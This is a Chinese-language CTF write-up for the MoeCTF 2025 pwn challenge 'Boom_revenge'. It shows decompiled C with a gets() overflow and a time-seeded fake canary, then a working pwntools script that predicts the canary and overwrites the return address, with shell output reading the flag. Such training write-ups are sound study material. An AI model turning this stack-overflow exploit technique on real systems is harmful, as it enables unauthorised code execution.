---
title: '西电CTF MoeCTF 2025 PWN Boom_revenge'
date: '2026-09-04T13:46:02+08:00'
lastmod: '2026-09-04T13:46:02+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - "CTF"
tags:
  - "CTF"
  - "Pwn"
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=966)

还是IDA。

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char s[124]; // [rsp+0h] [rbp-90h] BYREF
  int v5; // [rsp+7Ch] [rbp-14h]
  int v6; // [rsp+8Ch] [rbp-4h]

  init(argc, argv, envp);
  puts("Welcome to Secret Message Book!");
  puts("Do you want to brute-force this system? (y/n)");
  fgets(&brute_choice, 8, stdin);
  v6 = 0;
  if ( brute_choice == 121 || brute_choice == 89 )
  {
    v6 = 1;
    canary = (int)random() % 114514;
    v5 = canary;
    puts("waiting...");
    sleep(1u);
    puts("boom!");
    puts("Brute-force mode enabled! Security on.");
  }
  else
  {
    puts("Normal mode. No overflow allowed.");
  }
  printf("Enter your message: ");
  if ( v6 )
  {
    gets(s);
    if ( v5 != canary )
    {
      puts("Security check failed!");
      exit(1);
    }
  }
  else
  {
    fgets(s, 128, stdin);
  }
  puts("Message received.");
  return 0;
}
```

 可以看到这里是[boom](../XiDianCTF-MoeCTF-2025-PWN-boom\index.md)的升级版，要求v6非0并且v5==canary。

注意到

```c
void init()
{
  unsigned int v0; // eax

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  v0 = time(0LL);
  srandom(v0);
}
```

这里我们需要根据时间计算canary值。



pwntools脚本:

```python
from pwn import *
import ctypes
context(arch='amd64', os='linux', log_level='error')

io = connect("127.0.0.1", 43591)

libc = ctypes.CDLL("libc.so.6")

libc.srandom(int(time.time()))

rdm = libc.random() % 114514

io.sendline(b'y')

io.send(b'\x3f' * 124 + p32(rdm) + b'\x3f' * 24 + p64(0x40127B))

io.interactive()

```

输出:

```
Welcome to Secret Message Book!
Do you want to brute-force this system? (y/n)
waiting...
boom!
Brute-force mode enabled! Security on.
Enter your message: $
Message received.
$ ls
bin
flag
lib
lib32
lib64
libexec
libx32
pwn
$ cat flag
moectf{THIS_IS_FLAG}
$
```

